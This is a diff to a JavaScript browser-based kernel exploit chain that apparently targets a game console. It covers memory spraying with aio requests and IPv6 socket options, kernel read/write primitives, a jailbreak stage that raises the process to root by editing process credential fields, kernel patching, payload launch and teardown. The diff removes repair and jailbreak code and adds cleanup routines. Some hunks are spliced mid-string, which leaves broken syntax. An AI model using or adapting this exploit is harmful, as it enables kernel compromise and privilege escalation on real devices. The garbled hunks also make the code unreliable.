@@ -1134,6 +1134,7 @@ function makeRpc(worker) {
                 NUM_REQS, AIO_PRIORITY_HIGH, aioIds.addr);
             sc(SYS.aio_multi_cancel, aioIds.addr, NUM_REQS, outs.addr);
             sc(SYS.aio_multi_poll, aioIds.addr, NUM_REQS, outs.addr);
+
             sc(SYS.close, client);
 
             outs.dv.setUint32(0, 0, true);
@@ -2003,16 +2004,8 @@ function makeRpc(worker) {
                             + "stage 2 leaked", match,
                             match ? "so fdt_ofiles is correct and entries are 8 "
                                 + "bytes apart, not FreeBSD's 0x30"
-                                : "the table, the stride, or curproc is wrong");
-                    }
-
-                    if (fdtOfiles && kptr(fdtOfiles) && pipesOk) {
-                        const FILEDESCENT_SIZE = 8;
-                        function pipeFData(fd) {
-                            const fp = kread8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
-                            if (!fp || !kptr(fp)) return null;
-                            const d = kread8(fp);
-                            return (d && kptr(d)) ? { fp: fp, data: d } : null;
+                                : "the
+                                                          return (d && kptr(d)) ? { fp: fp, data: d } : null;
                         }
                         const m = pipeFData(masterPipe[0]);
                         const sl = pipeFData(slavePipe[0]);
@@ -2111,8 +2104,7 @@ function makeRpc(worker) {
                     }
                     check("read-primitive-survives-write", kstr2 === "evf cv",
                         "'" + kstr2 + "' after " + kwriteCalls + " pktinfo writes");
-                
-                    check("ip6po_pktinfo-not-left-interior"
+                    check("ip6po_pktinfo-not-left-interior",
                         kstr2 === "evf cv",
                         "a dangling interior pointer here is a free() of a "
                         + "non-allocation at teardown -- that is what panicked "
@@ -2845,161 +2837,7 @@ function makeRpc(worker) {
                                     const pipeFds = [masterPipe[0], masterPipe[1],
                                                      slavePipe[0], slavePipe[1]];
                                     const expectFp = [pipeMFp, null, pipeSFp, null];
-                                    let held = 0;
-                                    const holdLog = [];
-                                    for (let i = 0; i < pipeFds.length; ++i) {
-                                        const fp = fget(pipeFds[i]);
-                                        if (!kptr(fp)) {
-                                            holdLog.push(pipeFds[i] + ":fp=" + fp);
-                                            continue;
-                                        }
-                                        if (expectFp[i] && !sameI64(fp, expectFp[i])) {
-                                            holdLog.push(pipeFds[i] + ":fp=" + fp
-                                                + " != " + expectFp[i]);
-                                            continue;
-                                        }
-                                        const probe = kview(fp).getInt32(FILE_F_COUNT, true);
-                                        if (!(probe >= 1 && probe <= 16)) {
-                                            holdLog.push(pipeFds[i] + ":f_count=" + probe
-                                                + " implausible");
-                                            continue;
-                                        }
-                                        const h = fhold(fp);
-                                        holdLog.push(pipeFds[i] + ":" + h.before
-                                            + "->" + h.after);
-
-                                        if (h.after > h.before && h.after >= 2) held++;
-                                    }
-                                    mark("PIPE-REFCNT", holdLog.join("  "));
-                                    check("four-pipe-files-hold"
-                                        + "reference", held === 4,
-                                        held + "/4 -- without this, closing the master "
-                                        + "pipe kmem_frees slave's struct pipe, and "
-                                        + "closing the slave frees whatever address its "
-                                        + "pipebuf last pointed at");
-
-                                    const masterOne = holdLog.slice(0, 2).every(
-                                        function (s) { return /:1->/.test(s); });
-                                    check("f_count-read-1-master-fds"
-                                        + "what one fd and no other holder gives",
-                                        masterOne, masterOne
-                                            ? "so 0x28 is f_count. The slave pair reads "
-                                            + "high because kv's own read(slave[0]) and "
-                                            + "write(slave[1]) hold it while they work."
-                                            : holdLog.join(" ") + " -- if these are not "
-                                            + "small reference counts, 0x28 is the wrong "
-                                            + "field and the hold is corrupting "
-                                            + "something else");
-
-                                    kview(optsA).setBInt(PKTOPTS_PKTINFO, 0, true);
-
-                                    kview(optsA).setBInt(PKTOPTS_M, 0, true);
-                                    kview(optsB).setBInt(PKTOPTS_RTHDR, 0, true);
-                                    kview(optsC).setBInt(PKTOPTS_RTHDR, 0, true);
-
-                                    const backA = kview(optsA).getBInt(PKTOPTS_PKTINFO, true);
-                                    const backM = kview(optsA).getBInt(PKTOPTS_M, true);
-                                    const backB = kview(optsB).getBInt(PKTOPTS_RTHDR, true);
-                                    const backC = kview(optsC).getBInt(PKTOPTS_RTHDR, true);
-                                    const zeroed = function (v) {
-                                        return !!v && v.low === 0 && v.hi === 0;
-                                    };
-                                    mark("REPAIR-WRITE", "ip6po_pktinfo=" + backA
-                                        + " ip6po_m=" + backM
-                                        + " twin rthdr=" + backB
-                                        + " 0x80 rthdr=" + backC);
-                                    const cleared = zeroed(backA) && zeroed(backM)
-                                        && zeroed(backB) && zeroed(backC);
-                                    check("second-owner-reads-null"
-                                        + "pointer", cleared,
-                                        cleared ? "chunk X is freed once, by fd "
-                                            + pktoptsTwins[0] + "; chunk Y is freed by "
-                                            + "nobody and leaks 0x80 bytes"
-                                            : "at least one pointer did not clear");
-
-                                    chunkX.u8.fill(0);
-                                    kv.kread(chunkX.addr, reqs1Aligned, 0x100);
-                                    let leftover = 0;
-                                    for (let o = 0; o < 0x100; o += 8) {
-                                                
-                                        if (o === PKTOPTS_TCLASS) continue;
-                                        if ((chunkX.dv.getUint32(o, true) >>> 0)
-                                            || (chunkX.dv.getUint32(o + 4, true) >>> 0))
-                                            leftover++;
-                                    }
-                                    check("aliased-pktopts-entirely-zero"
-                                        + "except its tclass", leftover === 0,
-                                        leftover + " non-zero word(s) left -- head "
-                                        + hexBytes(chunkX.u8.subarray(0, 16)));
-
-                                    repaired = held === 4 && cleared && leftover === 0;
-                                    mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
-                                        repaired
-                                            ? "every doubly-owned allocation now has "
-                                              + "exactly one owner. cleanup() is "
-                                              + "unlocked."
-                                            : "the teardown stays locked; the reboot "
-                                              + "banner is still correct.");
-                                    if (repaired) {
-                                        pipeFdsHeld = pipeFds.slice();
-
-                                        kvProbe = function () {
-                                            const w = kview(evfCv).getBInt(0, true);
-                                            let s = "";
-                                            for (let i = 0; i < 8; ++i) {
-                                                const c = kv.view.dv.getUint8(i);
-                                                if (!c) break;
-                                                s += String.fromCharCode(c);
-                                            }
-                                            return { word: w, str: s };
-                                        };
-                                    }
-                                }
-
-                                if (!repaired) {
-                                    mark("JAILBREAK-SKIPPED", "the repair did not "
-                                        + "verify, so this run is already going to "
-                                        + "ask for a reboot. Doing more kernel "
-                                        + "writes on top of that is how a clean "
-                                        + "failure becomes a panic.");
-                                } else try {
-                                    state("stage 8: jailbreak...", "warn");
-
-                                    const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
-                                    const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
-                                    const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
-                                    const CR_NGROUPS = 0x10, CR_RGID = 0x14, CR_SVGID = 0x18;
-                                    const CR_PRISON = 0x30, CR_SCEAUTHID = 0x58;
-                                    const CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
-                                    const CR_SCEATTR0 = 0x83;
-                                    const FD_RDIR = 0x10, FD_JDIR = 0x18;
-                                    const KERNEL_PID = 0;
-
-                                    const SYSCORE_AUTHID = new int64(0x00000007, 0x48000000);
-
-                                    let walk = curproc, steps = 0, allproc = null;
-                                    while (steps < 4096) {
-                                        if (inImageAddr(walk)) { allproc = walk; break; }
-                                        if (!kptr(walk)) break;
-                                        walk = kview(walk).getBInt(P_LIST_PREV, true);
-                                        steps++;
-                                    }
-                                    mark("ALLPROC", (allproc || "NOT FOUND")
-                                        + "   after " + steps + " le_prev step(s) "
-                                        + "back from " + curproc
-                                        + (allproc && kbase ? "   = kernel_base + 0x"
-                                            + (allproc.low - kbase.low >>> 0).toString(16)
-                                            : ""));
-                                    check("allproc-reached-by-walking-p_list"
-                                        + "backwards", !!allproc,
-                                        allproc ? "it is a kernel image address, "
-                                            + "which is what &allproc must be"
-                                            : "the walk left the proc list");
-
-                                    const procs = [];
-                                    function pfind(pid) {
-                                        if (!allproc) return null;
-                                        let p2 = kview(allproc).getBInt(0, true);
+                                                        let p2 = kview(allproc).getBInt(0, true);
                                         for (let n = 0; n < 4096; ++n) {
                                             if (!p2 || !kptr(p2)) return null;
                                             const q = kview(p2).getInt32(P_PID, true);
@@ -3669,4 +3507,202 @@ function makeRpc(worker) {
                     const impl = p.read8(cell.add32(0x10));
                     return p.read8(impl.add32(0x10));
                 })();
-               
+                keepAlive.push(idBuf, idDv, outBuf);
+                let done = 0;
+                for (let i = 0; i < liveAioIds.length; i += AIO_MAX_NUM) {
+                    const step = Math.min(AIO_MAX_NUM, liveAioIds.length - i);
+                    for (let j = 0; j < step; ++j)
+                        idDv.setUint32(j * 4, liveAioIds[i + j], true);
+                    sc(SYS.aio_multi_poll, idAddr, step, outAddr);
+                    sc(SYS.aio_multi_delete, idAddr, step, outAddr);
+                    done += step;
+                }
+                mark("AIO-CLEANED", done + " sprayed ids deleted exactly once");
+            }
+        } catch (e) {
+            mark("AIO-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
+        }
+
+        try {
+            if (teardown && sc && mFunctionPatched) {
+                let n = 0;
+                for (let i = 0; i < ipv6Socks.length; ++i)
+                    if (ipv6Socks[i] > 0 && sc(SYS.close, ipv6Socks[i]).i32 === 0) n++;
+                mark("IPV6-SOCKS-CLOSED", n + "/" + ipv6Socks.length
+                    + " reclaim sockets; each still owned its own rthdr");
+            }
+        } catch (e) {
+            mark("IPV6-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (teardown && sc && mFunctionPatched && pktoptsTwins.length) {
+
+                const r = [];
+                for (let i = 0; i < pktoptsTwins.length; ++i)
+                    if (pktoptsTwins[i] > 0)
+                        r.push(pktoptsTwins[i] + ":"
+                            + sc(SYS.close, pktoptsTwins[i]).i32);
+                mark("PKTOPTS-TWINS-CLOSED", r.join("  ")
+                    + "   (fd " + pktoptsTwins[0] + " is the single free of the "
+                    + "0x100 chunk at " + (repaired ? "the audited address" : "?")
+                    + ")");
+            }
+        } catch (e) {
+            mark("PKTOPTS-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (teardown && sc && mFunctionPatched && twinSocks.length) {
+                const r = [];
+                for (let i = 0; i < twinSocks.length; ++i)
+                    if (twinSocks[i] > 0)
+                        r.push(twinSocks[i] + ":" + sc(SYS.close, twinSocks[i]).i32);
+                mark("RTHDR-TWINS-CLOSED", r.join("  ")
+                    + "   (rthdr nulled, so the 0x80 chunk is freed by nobody "
+                    + "and leaks)");
+            }
+        } catch (e) {
+            mark("RTHDR-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+
+        try {
+            if (teardown && kvProbe) {
+                const r = kvProbe();
+                mark("POST-CLEANUP-READ", "kv reads " + (r.word || "null")
+                    + " as '" + r.str + "' after every socket is closed");
+                check("kernel-r-w-primitive-survives",
+                    r.str === "evf cv", "got '" + r.str + "'");
+                cleanupDone = r.str === "evf cv";
+
+                let soak = 0;
+                for (let i = 0; i < 10; ++i) {
+                    await new Promise(function (res) { setTimeout(res, 200); });
+                    if (sc(SYS.getpid).i32 > 0 && kvProbe().str === "evf cv") soak++;
+                }
+                mark("SOAK", soak + "/10 checks over 2 s: getpid and an 8-byte "
+                    + "kernel read both still work");
+                check("console-standing-2-s-after",
+                    soak === 10, soak + "/10");
+            } else if (teardown) {
+                cleanupDone = true;
+                mark("POST-CLEANUP", "no kv probe was installed, so cleanup is "
+                    + "unproven beyond the close() return values");
+            }
+        } catch (e) {
+            mark("POST-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
+        }
+
+        try {
+            if (sc && mFunctionPatched && savedMask && savedPrio && restoreCtx) {
+                const mb = restoreCtx.maskBuf, pb = restoreCtx.prioBuf;
+                const ID = new int64(0xffffffff, 0xffffffff);
+                mb.u8.fill(0);
+                mb.dv.setUint32(0, savedMask.low, true);
+                mb.dv.setUint32(4, savedMask.hi, true);
+                const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
+                    CPU_WHICH_TID, ID, 0x10, mb.addr).i32;
+                pb.dv.setUint16(0, savedPrio[0], true);
+                pb.dv.setUint16(2, savedPrio[1], true);
+                const pr = sc(SYS.rtprio_thread, RTP_SET, 0, pb.addr).i32;
+
+                mb.u8.fill(0);
+                sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
+                    ID, 0x10, mb.addr);
+                const backMask = new int64(mb.dv.getUint32(0, true),
+                                           mb.dv.getUint32(4, true));
+                pb.dv.setUint16(0, 0xffff, true);
+                pb.dv.setUint16(2, 0xffff, true);
+                sc(SYS.rtprio_thread, RTP_LOOKUP, 0, pb.addr);
+                const backPrio = [pb.dv.getUint16(0, true), pb.dv.getUint16(2, true)];
+                const good = sameI64(backMask, savedMask)
+                    && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
+                mark("THREAD-ATTRS-RESTORED",
+                    "affinity set=" + ar + " reads " + backMask
+                    + "   rtprio set=" + pr + " reads {" + backPrio + "}"
+                    + "   wanted " + savedMask + " {" + savedPrio + "}"
+                    + (good ? "  ok" : "  MISMATCH -- the next page load will "
+                       + "run on a mis-scheduled main thread"));
+            }
+        } catch (e) {
+            mark("THREAD-ATTRS-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (workerArmed && rpc) {
+                const d = await rpc("disarm");
+                mark("WORKER-DISARMED", "restored=" + d.restored
+                    + " expm1(1)=" + d.expm1);
+                workerArmed = false;
+            }
+        } catch (e) {
+            mark("WORKER-DISARM-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (workerWired && window.p && wMasterAddr && origWorkerVector) {
+                window.p.write8(wMasterAddr.add32(0x10), origWorkerVector);
+                workerWired = false;
+                mark("WORKER-UNWIRED", "master.m_vector restored");
+            }
+        } catch (e) {
+            mark("WORKER-UNWIRE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (cellCorrupted && window.p && mainPivotAddr && mainSavedCell) {
+                window.p.write8(mainPivotAddr, mainSavedCell);
+                cellCorrupted = false;
+                mark("JSCELL-RESTORED", "late -- the window was left open");
+            }
+        } catch (e) { }
+        try {
+            if (mFunctionPatched && window.p && execAddr && origNative) {
+                const a = execAddr.add32(0x28);
+                window.p.write8(a, origNative);
+                mFunctionPatched = false;
+                const back = window.p.read8(a);
+                const v = Math.expm1(1);
+                mark("EXPM1-RESTORED", "m_function=" + back
+                    + (sameI64(back, origNative) ? " ok" : " MISMATCH")
+                    + "  expm1(1)=" + v
+                    + (Math.abs(v - 1.718281828459045) < 1e-12 ? " ok" : " WRONG"));
+            }
+        } catch (e) {
+            mark("EXPM1-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+
+        const stillDirty = (rebootRequired || committed || committed2)
+            && !(repaired && cleanupDone);
+        if (stillDirty) {
+            mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
+                + "browser normally. power the console off and back on.");
+            try {
+                stateEl.textContent = "REBOOT THE CONSOLE";
+                stateEl.className = "bad";
+            } catch (e) { }
+            if (!payloadRunning) {
+                hostFail();
+            }
+        } else if (repaired && cleanupDone) {
+                        if (payloadRunning) {
+                hostOk();
+            }
+            mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
+                + " chunkY=leaked-0x80 pipes=+1ref-each"
+                + " leaks=2-pipe-pairs+0x80");
+            mark("STEP-4Q-DONE", payloadRunning
+                ? "chain=complete leftovers=none"
+                : kpatched
+                ? "repaired, torn down, root, kernel patched -- but the payload "
+                  + "did not start. It is mapped and verified; only the launch "
+                  + "is missing."
+                : "the corrupted context is repaired and the environment is "
+                  + "torn down" + (jailbroken ? ", and the process is root"
+                    : "") + ". See the stage 8/9/10 marks for what is left.");
+            try {
+                stateEl.textContent = payloadRunning
+                    ? "ALL DONE"
+                    : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
+                    : jailbroken ? "ROOT -- NO REBOOT NEEDED"
+                    : "REPAIRED -- NO REBOOT NEEDED";
+                stateEl.className = "ok";
+            } catch (e) { }
+        }
+    }
+})();
